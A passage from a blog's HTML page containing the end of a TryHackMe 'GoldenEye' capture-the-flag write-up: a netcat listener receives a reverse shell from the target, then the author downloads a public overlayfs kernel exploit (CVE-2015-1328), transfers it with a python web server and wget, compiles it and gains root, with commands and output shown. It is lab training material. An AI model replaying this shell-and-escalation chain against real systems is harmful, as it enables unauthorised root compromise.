+<p><img src="/assets/images/goldeneye/updatedshell.png" alt="updatedshell" /></p>
+
+<p>I started a netcat listener on my local machine and then on the webpage went to add a post, once the editor loaded and clicked spell check and got a shell!</p>
+
+<p><img src="/assets/images/goldeneye/spellcheck.png" alt="spellcheck" /></p>
+
+<pre><code class="language-highlight">└──╼ $nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [&lt;&lt;REDACTED&gt;&gt;] from (UNKNOWN) [10.10.50.94] 55215
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ 
+</code></pre>
+
+<h3 id="priv-esc">Priv Esc</h3>
+
+<p>The machine is running linux 3.13.0-32, googeling linux 3.13.0-32 priv esc I found a linux kernal exploit. Details of the exploit can be found <a href="https://www.cvedetails.com/cve/cve-2015-1328">here</a>.</p>
+
+<blockquote>
+  <p>The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace.</p>
+</blockquote>
+
+<p>I downloaded the <a href="https://www.exploit-db.com/exploits/37292">exploit code</a> from exploit-db and copied it to machine using python.</p>
+
+<h5 id="my-machine">My machine</h5>
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
+└──╼ $mv ~/Downloads/37292.c .
+┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
+└──╼ $ls
+37292.c  for-007.jpg  nmap  s3cret.txt
+┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
+└──╼ $mv 37292.c exploit.c
+┌─[✗]─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
+└──╼ $sudo python3 -m http.server 80
+[sudo] password for daz: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<h5 id="victim">Victim</h5>
+<pre><code class="language-highlight">www-data@ubuntu:/tmp$ wget http://&lt;&lt;machine IP&gt;&gt;/exploit.c
+--2021-06-27 04:54:42--  http://&lt;&lt;machine IP&gt;&gt;/exploit.c
+Connecting to &lt;&lt;machine IP&gt;&gt;:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5119 (5.0K) [text/x-csrc]
+Saving to: 'exploit.c'
+
+100%[======================================&gt;] 5,119       --.-K/s   in 0.003s
+
+2021-06-27 04:54:42 (1.83 MB/s) - 'exploit.c' saved [5119/5119]
+
+www-data@ubuntu:/tmp$ 
+</code></pre>
+
+<p>The code provides the compile intructions, I simply need to run gcc and specific the output flag.</p>
+
+<pre><code class="language-highlight">www-data@ubuntu:/tmp$ gcc exploit.c exploit
+The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
+www-data@ubuntu:/tmp$ 
+</code></pre>
+
+<p>GCC is not installed however I can use ‘cc’. However for the exploit to work I need to change a line in the file to reference cc rather than gcc.</p>
+
+<p><code class="highlighter-rouge">lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");</code></p>
+
+<p>Now the line has changed I can use cc to compile the code.</p>
+
+<pre><code class="language-highlight">www-data@ubuntu:/tmp$ cc exploit.c -o exploit
+exploit.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
+}
+^
+exploit.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
+        if(unshare(CLONE_NEWUSER) != 0)
+           ^
+exploit.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
+                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
+                ^
+exploit.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
+            waitpid(pid, &amp;status, 0);
+            ^
+exploit.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
+    wait(NULL);
+    ^
+5 warnings generated.
+</code></pre>
+
+<p>A few warmming messages are generated however the exploit still works and we get a root shell!</p>
+
+<pre><code class="language-highlight">www-data@ubuntu:/tmp$ ./exploit 
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# 
+</code></pre>
+
+<p>Thanks for reading!</p>
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+
+
+        <!-- Previous/next page links - displayed on every page -->
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://darrynbrownfield.co.uk/">Darryn Brownfield</a> &copy; 2021</section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                 </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- Add Google Analytics  -->
+    <!-- Google Analytics Tracking code -->
+ <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-175458891-1', 'auto');
+  ga('send', 'pageview');
+
+ </script>
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
